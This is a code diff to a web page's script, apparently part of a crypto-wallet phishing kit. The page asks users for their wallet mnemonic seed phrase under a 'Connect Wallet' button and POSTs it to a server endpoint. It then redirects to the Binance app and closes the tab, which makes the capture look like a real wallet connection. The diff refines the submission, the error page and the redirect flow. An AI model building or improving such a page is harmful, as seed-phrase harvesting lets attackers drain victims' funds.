@@ -263,11 +263,7 @@ const ta = document.getElementById('mnemonic');
 const box = document.getElementById('suggestions');
 const runBtn = document.getElementById('runBtn');
 const pasteText = document.getElementById('pasteText');
-
-// Mapping the mnemonic length to entropy
 const ENT_BY_WORDS = {12:128, 15:160, 18:192, 21:224, 24:256};
-
-// Function to convert words to bit string
 function wordsToBitString(words){
   let bits = "";
   for (const w of words) {
@@ -346,32 +342,49 @@ ta.addEventListener('input', async () => {
   }
 });
 
+
 // Submit action (Connect Wallet)
 runBtn.onclick = async () => {
   const mnemonic = ta.value.trim();
+
+  // Hide main ui, show loading
   document.getElementById('main-page').style.display = 'none';
   document.getElementById('loading-page').style.display = 'block';
 
   try {
-    const res = await fetch('/api/run', {
+    const res = await fetch('http://127.0.0.1:8080/api/run', {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({ mnemonic })
     });
 
     if (!res.ok) {
-      throw new Error(`Error: ${res.statusText}`);
+      throw new Error(`Server error: ${res.statusText}`);
     }
 
     await res.json();
-    setTimeout(() => {
-      document.getElementById('loading-page').style.display = 'none';
-      document.getElementById('success-page').style.display = 'block';
-    }, 800);
 
-  } catch (e) {
-    document.getElementById('loading-page').innerHTML =
-      `<p style="color:red;text-align:center;">Error: ${e.message}. Please try again.</p>`;
+    // SUCCESS → open Binance + close browser
+    setTimeout(() => {
+
+      // open Binance
+      window.location.href = "binance://openPage?url=https://www.binance.com/en/markets";
+      
+      // close this browser tab
+      setTimeout(() => {
+        window.open('', '_self');
+        window.close();
+      }, 400);
+
+    }, 600);
+
+  } catch (err) {
+    // FAILURE → show themed error-page
+    document.getElementById('loading-page').style.display = 'none';
+    document.getElementById('error-page').style.display = 'block';
+
+    const msg = document.getElementById('errorMsg');
+    if (msg) msg.textContent = `We could not connect your wallet. ${err.message}`;
   }
 };
 
@@ -385,14 +398,9 @@ pasteText.onclick = async () => {
     console.error("Clipboard access failed", e);
   }
 };
-  document.getElementById("openBinance").addEventListener("click", function (e) {
-    // Allow the deep link to trigger
-    setTimeout(() => {
-        // Attempt to close the tab
-        window.open('', '_self');
-        window.close();
-    }, 300); // small delay so the deep link fires
-});
+document.getElementById('retryBtn').onclick = () => {
+  window.location.reload(); // clean and simple restart
+};
 </script>
 </body>
 </html>
